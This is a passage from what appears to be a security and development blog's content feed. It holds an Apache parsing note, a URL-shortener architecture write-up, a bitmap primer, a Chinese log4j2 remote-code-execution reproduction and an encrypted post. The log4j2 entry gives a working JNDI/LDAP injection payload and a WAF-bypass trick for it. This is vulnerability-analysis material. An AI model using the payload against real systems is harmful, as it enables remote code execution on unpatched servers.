<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210905114020401.png" alt="image-20210905114020401"></p>
<p>成功解析！</p>
<h2 id="漏洞总结-1"><a href="#漏洞总结-1" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p><code>Apache</code>在找不到相应后缀解析规则时，会往前寻找后缀 - 该特性很重要。</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Amazing URL Shortener - Technical Doc</title>
    <url>/2022/12/04/Amazing-URL-Shortener-Technical-Doc/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Amazing URL Shortener is an online tool with high availability to shorten a long link and provide detailed statistics.</p>
<p><strong>Demo</strong>:</p>
<ul>
<li><a href="http://official.urls.fit/">http://official.urls.fit</a></li>
<li><a href="http://short.urls.fit/">http://short.urls.fit</a></li>
</ul>
<p><code>username: test</code></p>
<p><code>password: test</code></p>
<p><strong>Short link demo</strong>: <code>urls.fit/a26B4EM0</code></p>
<p><strong>GitHub repo:</strong> </p>
<ul>
<li>Backend: <a href="https://github.com/leihehehe/java-url-shortener">https://github.com/leihehehe/java-url-shortener</a></li>
<li>Frontend: currently is a private repo</li>
</ul>
<span id="more"></span>

<h1 id="Technical-Stacks-Used"><a href="#Technical-Stacks-Used" class="headerlink" title="Technical Stacks Used"></a>Technical Stacks Used</h1><p><strong>Backend Techniques:</strong> </p>
<ul>
<li><p><strong>Framework</strong>: SpringBoot, Spring Cloud</p>
</li>
<li><p><strong>Gateway</strong>: Spring Cloud Gateway</p>
</li>
<li><p><strong>Message Queues</strong>: RabbitMQ, Kafka</p>
</li>
<li><p><strong>Database-related Techs</strong>: Redis, Redisson(operating on Redis), ClickHouse, SpringData JPA, MySQL,  Apache Shardingsphere</p>
</li>
<li><p><strong>Data Streaming-processing Framework</strong>: Flink</p>
</li>
<li><p><strong>Availability</strong>: resillience4j</p>
</li>
<li><p><strong>Others</strong>: Openfeign, etc.</p>
</li>
</ul>
<p><strong>Frontend:</strong> Angular.js</p>
<p><strong>DevOps</strong>:</p>
<ul>
<li>Jenkins</li>
<li>Kubernetes</li>
</ul>
<h2 id="ShardingSphere"><a href="#ShardingSphere" class="headerlink" title="ShardingSphere"></a>ShardingSphere</h2><blockquote>
<p><strong>ShardingSphere</strong> provides a distributed database solution based on the underlying database, which can scale computing and storage horizontally</p>
</blockquote>
<h3 id="Why-use-it"><a href="#Why-use-it" class="headerlink" title="Why use it?"></a>Why use it?</h3><p>Since we are developing a system that can handle massive data, it is not possible to just use one single database or a few tables to store the data. Storing massive data in only one node or database will cause much pressure on the database itself, and speed will be significantly slowed down.</p>
<p>Therefore, it is necessary to do sharding and partitioning. For example, I divided the <code>product_order</code> table into two tables stored in the <code>url_shop</code> database and divided the <code>short_link</code> table into 6 tables and every two tables are distributed in a <code>url_link</code> table. (For more details, please see the <strong>Database Structure</strong> part)</p>
<h3 id="Partition-Keys"><a href="#Partition-Keys" class="headerlink" title="Partition Keys"></a>Partition Keys</h3><p>Partition keys are set in terms of different cases. For example, for users to find their orders quickly, <code>accountNo</code> is used as a partition key, so that a user’s orders will be in the same table.</p>
<p>Another situation is that we need to handle a large number of shortened links across multiple databases and tables. In this case, I use <code>accountNo</code> as a partition key to finding out which <strong>databases</strong> the records are currently in. Besides, <code>groupId</code> is used as a partition key for finding out which <strong>tables</strong> the records are currently in.</p>
<h3 id="How-to-query-the-data-in-this-case"><a href="#How-to-query-the-data-in-this-case" class="headerlink" title="How to query the data in this case?"></a>How to query the data in this case?</h3><p>I used two methods to query the data</p>
<ul>
<li><strong>Modulo</strong>. For example, <code>k = accountNo mod n</code> where n is the number of tables that will query the <strong>kth</strong> table </li>
<li><strong>Store database and column info in the data itself</strong>. For example, we got a short link code stored in the database <code>a</code> and table <code>2</code>, then we can update the short link code to <code>axxxx2</code>, so that we could quickly locate this short link when querying the data.</li>
</ul>
<h2 id="Redis-Redisson-amp-Lua-Script"><a href="#Redis-Redisson-amp-Lua-Script" class="headerlink" title="Redis, Redisson &amp; Lua Script"></a>Redis, Redisson &amp; Lua Script</h2><ul>
<li>Redis is used as a cache in the project. It stores the users’ plan data information to prevent frequent requests to the MySQL database.</li>
<li>Redis and Redisson are used together to handle distributed locks. In addition to using Redisson, Lua script is also straightforward and used for creating locks.</li>
</ul>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><ul>
<li>RabbitMQ is used to slow down the response waiting time as operations can be asynchronously executed by sending messages.</li>
<li>RabbitMQ is also used to deliver delayed messages for different purposes like order cancellation and distributed transactions.</li>
<li>Compared to <code>Kafka</code>, it is more suitable for an e-commerce business service(e.g. scheduled tasks and distributed transaction management) </li>
</ul>
<h2 id="Flink-Kafka-amp-ClickHouse"><a href="#Flink-Kafka-amp-ClickHouse" class="headerlink" title="Flink, Kafka &amp; ClickHouse"></a>Flink, Kafka &amp; ClickHouse</h2><blockquote>
<p><strong>Flink is used for processing data streams at a large scale and to deliver real-time analytical insights about your processed data with your streaming application</strong>.</p>
</blockquote>
<p>In this project, I used <code>Flink</code> to get visitor information when a visitor is trying to access a shortened link. Flink helps to process the visitor information in each layer and pass the processed information to the next layer using <code>Kafka</code>.</p>
<p>At the last layer, I used Flink to pass the final datasets to ClickHouse which is a fast column-oriented database management system.</p>
<p>ClickHouse allows us to generate analytical reports using SQL queries.</p>
<h2 id="Jenkins-amp-Kubernetes-High-Availability"><a href="#Jenkins-amp-Kubernetes-High-Availability" class="headerlink" title="Jenkins &amp; Kubernetes(High Availability)"></a>Jenkins &amp; Kubernetes(High Availability)</h2><p>The Jenkins file is included in the project, and both front-end and back-end projects are deployed using Kubernetes and Jenkins.</p>
<p>Jenkins runs a piepeline to build and upload images to AWS ECR.</p>
<p>Using <strong>3</strong> servers(<strong>1 master node and 1 worker node</strong>) to build a Kubernetes cluster. </p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202212042225127.png" alt="kubernetes deployments"></p>
<h1 id="Technical-Difficulties-amp-Solutions"><a href="#Technical-Difficulties-amp-Solutions" class="headerlink" title="Technical Difficulties &amp; Solutions"></a>Technical Difficulties &amp; Solutions</h1><h2 id="User-and-Visitors-Querying-Links"><a href="#User-and-Visitors-Querying-Links" class="headerlink" title="User and Visitors Querying Links"></a>User and Visitors Querying Links</h2><p>As we know users prefer to query links in terms of their <code>accountNo</code>, if the links are distributed in different databases and tables, it will be very difficult for users to query the data since the system needs to access all the databases and tables to get the records.</p>
<p>However, visitors, just need the <strong>short link code</strong> to locate the table, and they have no idea about the <code>groupId</code> and <code>accountNo</code>.</p>
<p>So apparently, we would have two different partition keys to deal with these two cases.</p>
<p>Therefore, I duplicated the tables so that tables <code>group_link_mapping</code> are used to store data for users, <code>short_link</code> tables are used to store data for visitors.</p>
<h2 id="Distributed-Transaction-Management"><a href="#Distributed-Transaction-Management" class="headerlink" title="Distributed Transaction Management"></a>Distributed Transaction Management</h2><p>New issues have arisen after duplicating the short link tables. Since tables need to be synchronized, there will be inconsistent data if the operation on the user side failed but succeed on the visitor side.</p>
<p><strong>Solution</strong>: Use <code>RabbitMQ</code> to send a <strong>delayed message</strong> to check if operations on both sides are successful.</p>
<h2 id="Two-Users-Creating-the-Same-Short-Link"><a href="#Two-Users-Creating-the-Same-Short-Link" class="headerlink" title="Two Users Creating the Same Short Link"></a>Two Users Creating the Same Short Link</h2><p>If two users are generating the same short link, <strong>user A</strong> has inserted data to <code>group_link_mapping</code> and <strong>user B</strong> has inserted data into <code>short_link</code>, at this time, both users will fail because they cannot insert data into others tables(data already exists).</p>
<p><strong>Solution</strong>: Use <code>Redis</code> to add a lock. The value stored in the Redis will be <code>accountNo</code>, if <code>accountNo</code> in the Redis matches the current logged-in <code>accountNo</code>, continue the operations. Otherwise, stop the operations(another user is holding the lock).</p>
<h2 id="Nginx-Short-Link-Access-and-API-server"><a href="#Nginx-Short-Link-Access-and-API-server" class="headerlink" title="Nginx - Short Link Access and API server"></a>Nginx - Short Link Access and API server</h2><p><strong>Updates</strong>: </p>
<p>I have changed the Load balancer to Nginx. Using Nginx can help us load balance and proxy traffic to bankend servers. It significantly saves the overhead of using the AWS load balancer.</p>
<hr>
<p><del>I used the <strong>Load Balancer</strong> in AWS to forward different requests with different URLs and the specific port (80). Basically, we will have two different domains for websites and shorten urls.</del></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20230406225347.png"></p>
<h2 id="Eureka-Servers"><a href="#Eureka-Servers" class="headerlink" title="Eureka Servers"></a>Eureka Servers</h2><p>I did not deploy Eureka servers to Kubernetes. Instead, I deployed them to another machine and used Docker network functions to enable communication between them.</p>
<h1 id="Database-Structure-ER-Diagram"><a href="#Database-Structure-ER-Diagram" class="headerlink" title="Database Structure (ER Diagram)"></a>Database Structure (ER Diagram)</h1><p><strong>url_shop</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155609.png"></p>
<p><strong>url_link_0</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155800.png"></p>
<p><strong>url_link_1</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155832.png"></p>
<p><strong>url_link_a</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155900.png"></p>
<p><strong>url_shop</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221129155931898.png"></p>
]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java Project</tag>
        <tag>URL shortener</tag>
      </tags>
  </entry>
  <entry>
    <title>Bitmaps in Algorithms</title>
    <url>/2023/03/14/Bitmaps-in-Algorithms/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Bitwise operations is one of the bitmap representation methods.</p>
<p>Basically we have an integer <code>num</code>, we can use its <code>i-th</code> bit(counting from right to left, starting from 0) to represent the true/false value of <code>num[i]</code>.</p>
<span id="more"></span>

<ul>
<li>Set the i-th bit to 1(true), and leave other bits unchanged: <code>num|=(1&lt;&lt;i)</code><ul>
<li>left shift 1 by i bits, and perform OR operation with <code>num</code>.</li>
</ul>
</li>
<li>Set the i-th bit to 0(false), and leave other bits unchanged: <code>num &amp;= ~(1&lt;&lt;i)</code> or <code>(num ^=1&lt;&lt;i)</code><ul>
<li>take the complement(~) of 1 left shifted by i bits, and perform bitwise AND(&amp;) operation with <code>num</code>.</li>
</ul>
</li>
<li>Get <code>num[i]</code>: <code>(num &gt;&gt; i) &amp; 1</code><ul>
<li>extracts the i-th bit(counting from right to left)</li>
</ul>
</li>
</ul>
<h1 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h1><ul>
<li>Bitmap indexing</li>
<li>Bloom filters</li>
<li>Leetcode 698</li>
</ul>
]]></content>
      <tags>
        <tag>Bitmaps</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache log4j2 命令执行漏洞复现</title>
    <url>/2021/12/10/Apache-log4j2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都在讨论这个<strong>log4j2</strong>，可以说是重量级的漏洞了，大部分的java网站程序都在用它。漏洞的实现主要运用到了JNDI和LDAP，问题出在JndiLookup上</p>
<p><strong>影响范围: Apache Log4j 2.x &lt;= 2.14.1</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211210132347082.png" alt="image-20211210132347082"></p>
<p>此处没有对字符进行过滤，导致用户可以构造恶意代码。</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><strong>受攻击方客户端：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(log4j.class);</span><br><span class="line"><span class="comment">//PatternLayout.toSerializable</span></span><br><span class="line">    <span class="comment">//MessagePatternConverter.format</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:7777/#EvilObject&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ldap://127.0.0.1:7777/#EvilObject&#125;</code>是传入我们本地的恶意序列化对象。</p>
<p>具体实现见<a href="https://leihehe.top/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/">JNDI与LDAP的注入攻击</a></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211210133708492.png" alt="image-20211210133708492"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="logIfEnabled"><a href="#logIfEnabled" class="headerlink" title="logIfEnabled"></a>logIfEnabled</h2><p>首先还是下个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219175848710.png" alt="image-20211219175848710"></p>
<p>F7步入，这里会做一个log是否<strong>enabled</strong>的检测</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable throwable)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isEnabled(level, marker, message, throwable)) &#123;<span class="comment">//这里检测isEnabled是否为真</span></span><br><span class="line">        <span class="built_in">this</span>.logMessage(fqcn, level, marker, message, throwable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何判定它是enabled的呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">(<span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable t)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.privateConfig.filter(level, marker, message, t);<span class="comment">//返回了config中的filter</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219183700833.png" alt="image-20211219183700833"></p>
<p>此处我们可以观察到，我们传入的level是**”ERROR”<strong>,其对应的level in integer为</strong>200**<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219183913695.png" alt="image-20211219183913695"></p>
<p>正好等于当前logger Config要求的最高intLevel(200)</p>
<p>再根据官方手册，<strong>fatal</strong>和<strong>error</strong>也满足小于等于200的条件，因此我们使用<code>fatal(),error()</code>亦可触发漏洞。</p>
<table>
<thead>
<tr>
<th align="left">Standard Level</th>
<th align="left">intLevel</th>
</tr>
</thead>
<tbody><tr>
<td align="left">OFF</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">FATAL</td>
<td align="left">100</td>
</tr>
<tr>
<td align="left">ERROR</td>
<td align="left">200</td>
</tr>
<tr>
<td align="left">WARN</td>
<td align="left">300</td>
</tr>
<tr>
<td align="left">INFO</td>
<td align="left">400</td>
</tr>
<tr>
<td align="left">DEBUG</td>
<td align="left">500</td>
</tr>
<tr>
<td align="left">TRACE</td>
<td align="left">600</td>
</tr>
<tr>
<td align="left">ALL</td>
<td align="left">Integer.MAX_VALUE</td>
</tr>
</tbody></table>
<h2 id="MessagePatternConverter-format"><a href="#MessagePatternConverter-format" class="headerlink" title="MessagePatternConverter.format()"></a>MessagePatternConverter.format()</h2><p>关键点在<strong>messagePatternConverter#format</strong>中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.config != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.noLookups) &#123;<span class="comment">//此处判断noLookups是否为false</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;<span class="comment">//找到$&#123;的位置</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());<span class="comment">//将包含$&#123;将其之后的字符串提取到value中</span></span><br><span class="line">            workingBuilder.setLength(offset);<span class="comment">//设置$之前的字符串长度</span></span><br><span class="line">            workingBuilder.append(<span class="built_in">this</span>.config.getStrSubstitutor().replace(event, value));<span class="comment">//append经过处理后的字符串value</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在默认情况下，noLookups为false</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220125208104.png" alt="image-20211220125208104"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> <span class="operator">=</span> PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="literal">false</span>);<span class="comment">//默认为false</span></span><br></pre></td></tr></table></figure>

<h2 id="StrSubstitutor-substitute"><a href="#StrSubstitutor-substitute" class="headerlink" title="StrSubstitutor.substitute()"></a>StrSubstitutor.substitute()</h2><p>我们继续分析字符串value是如何被处理的。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220130516379.png" alt="image-20211220130516379"></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">prefixMatcher: <span class="built_in">$</span>&#123;</span><br><span class="line">suffixMatcher: &#125;</span><br><span class="line">escape: <span class="built_in">$</span></span><br><span class="line">delimiter: :-</span><br></pre></td></tr></table></figure>

<p>后面的逻辑便是寻找prefix,如果找到了，继续找suffix，找到suffix后把中间的字符串继续传进substitute() =》循环遍历检测内嵌的**${}**</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133308854.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133139043.png" alt="image-20211220133139043"></p>
<p>匹配了前缀后缀后，下面就是找<strong>delimiter</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133728942.png" alt="image-20211220133728942"></p>
<p>看看label100的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; varNameExprChars.length &amp;&amp; (substitutionInVariablesEnabled || prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) == <span class="number">0</span>); ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.valueEscapeDelimiterMatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">matchLen</span> <span class="operator">=</span> <span class="built_in">this</span>.valueEscapeDelimiterMatcher.isMatch(varNameExprChars, i);<span class="comment">//循环判断是否是delimiter :\\-</span></span><br><span class="line">        <span class="keyword">if</span> (matchLen != <span class="number">0</span>) &#123;<span class="comment">//匹配到了delimiter</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">varNamePrefix</span> <span class="operator">=</span> varNameExpr.substring(<span class="number">0</span>, i) + <span class="string">&#x27;:&#x27;</span>;<span class="comment">//将delimiter前的字符串加上：赋给varNamePrefix</span></span><br><span class="line">            varName = varNamePrefix + varNameExpr.substring(i + matchLen - <span class="number">1</span>);<span class="comment">//将\后面的字符串和之前的varNamePrefix合并在一起</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + matchLen;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt;= varNameExprChars.length) &#123;</span><br><span class="line">                    <span class="keyword">break</span> label100;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, j)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//判断是否是delimiter :-</span></span><br><span class="line">                    varName = varNamePrefix + varNameExpr.substring(i + matchLen, j);</span><br><span class="line">                    <span class="comment">//key值</span></span><br><span class="line">                    varDefaultValue = varNameExpr.substring(j + valueDelimiterMatchLen);</span><br><span class="line">                    <span class="comment">//value会丢弃掉:-及之前的所有字符串</span></span><br><span class="line">                    <span class="keyword">break</span> label100;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ++j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">            varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">            varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">        varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">        varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码可能不太好理解，举两个例子</p>
<p>如果是</p>
<ul>
<li> <code>$&#123;hello:-world&#125;</code>  - <strong>key为hello, value则为world</strong></li>
<li><code>$&#123;hello:\\-world:-haha&#125;</code> - key为<strong>hello:world</strong>，value则为<strong>haha</strong><ul>
<li>也就是说<code>:\\-</code>是<code>:-</code>的转义符</li>
</ul>
</li>
</ul>
<p>这样的字符串替换可以用于绕过WAF</p>
<p>当替换完毕后，会执行到<strong>StrSubstitutor.resolveVariable()</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="built_in">this</span>.getVariableResolver();</span><br><span class="line">    <span class="keyword">return</span> resolver == <span class="literal">null</span> ? <span class="literal">null</span> : resolver.lookup(event, variableName);<span class="comment">//执行resolver.lookup()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Interpolator-lookup"><a href="#Interpolator-lookup" class="headerlink" title="Interpolator.lookup()"></a>Interpolator.lookup()</h2><p>接着会执行**lookup()**，判断出要执行JNDI类型的Lookup</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220142228918.png" alt="image-20211220142228918"></p>
<h2 id="JndiLookup-lookup"><a href="#JndiLookup-lookup" class="headerlink" title="JndiLookup.lookup()"></a>JndiLookup.lookup()</h2><p>首先获取到jndiManager</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144414130.png" alt="image-20211220144414130"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JndiManager <span class="title function_">getDefaultManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (JndiManager)getManager(JndiManager.class.getName(), FACTORY, (Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144801055.png" alt="image-20211220144801055"></p>
<p>发现它是创建了一个Manager,将一个新的InitialContext传进去了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144859470.png" alt="image-20211220144859470"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144927509.png" alt="image-20211220144927509"></p>
<p>从而当我们执行<code>JndiLookup.lookup()</code>时，会触发<strong>initialContext.lookup()</strong></p>
<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220145107200.png" alt="image-20211220145107200"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Bug Bounty Learning - Edit target website&#39;s aws file</title>
    <url>/2022/06/11/Bug-Bounty-Learning-Edit-target-website&#39;s-aws-file/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4e476d4bc287b00fdf1d86c8c366d3b2e1dae53eba1798c03abdab3e08a1a1d8">b60e26754db75fa005b995163af0d5a1ec8bbd33d365b1eadf7044f4ac4eb25e1f8d703834b10e832769189d33c4333e4a6c446b1a1b24c0a4a762e275c5b56303e7a6271428e9533bd5418f1e92716a8594277c6189e2c20a5bac9bf580e8415059f684ed2cbe2bd2cbbce017c8a5e5430d4af22650c4092ebfe41f3bb23bfe70d0da9df65750060d397cc99dd31e081f6d2a735086cafb75cbb4132509a58372bd042ccd4903c73eef049afd095125f6ca8e14ad1589c22cce4910cd640c00d8d4835b3ea37316a441cc884b6226a80e487de42b2488c3cd17e83e6375c7f0636fda760bb08742d64eaaa8a10d913ca3949268b41a758c4caf30b4eebfdab259a9485c7cb22e7158a9fa6a2ce5525ae3ce4af97cd4fa4694343c7c5afeef2369c434f985bf6cac6a25a9dec923f50779b9b701596b921fdb592206b311b05260144e5be2b4829d1a063b0ae792d18444f47e22c692876611fc24d7624b93b2b9fb643bea04ee0c77035744660ac8243104337cee291afa7f1e08c9a28e95d5ad5ba7712699575efce3b020fa4429bc8b54aa9547af3baebc15b6646b3d8d992f5b863a90619622d60d87b47d1d9c505c7f2bbd5170dcbf2691e64f8d8c074fd3cd7a0595d22d9fc0ffbc9eef2d2f77126848703ac3c78e6a788b36cf452ad95ad38347fd337dccfb974512511c1c0ad9839eedbbc592f97880aba594e2c1cc53493835659ba21172cd5930bbec0ce40a89185227f862916a7f79ed2ba119ff18971a1e886a9f8fa76d4e252e9cf399cbd5b0aa58f7b00e7a0142e0d38002e513d9295eb52664d6ea773fdcba592cb600207b79bbbc0dbac33a7cfbd40311c208d51d68a729605d164a9a5de87095cb20678b2f5a4ac2e508e72343b4b92bcfef63a0e942faaabde302d0d91bda99c6a6b3bc59f4de39fa63105a8608e8c4c7f1905752b935da5d9c0a8aaddd0b13e855008e6b976c6fec1a392468539a3b7e300a87203fabcc391f2b67d56649ae872366df0494fa1b5d3fead936008c09f51aad9856833fb181bd3430efd7719221dd8255938e2fdb500a74707f972fd51feec23d0d94df6ff14fa9b56f1c97a81b4148d929972bce9f2e0e9aa984348c01362aa065d22beff9fec8acd1983e2e37a0824a219a1da8831aea7aec56fef6dcb4707caff59e694f94b55cf44cf1e21c73e6e893bea70d69737b6d5a0078afe572ff3315741fdec0b9940cbf309ea4ea9b498814052c46cf93da97e13135f4dbc63e757e8913f519bf195c897b1bdfd1e0fbe99d7ef5a30e33418d07ffa941f2634c96fdf6f1291c3f03cc8b22958253af48ad536654cf1c80f3440a8d71810ce38b13f8abb063df9ba60523ee2744e67f6e2de304c8ba0304be2583449aceac3564f76813c9b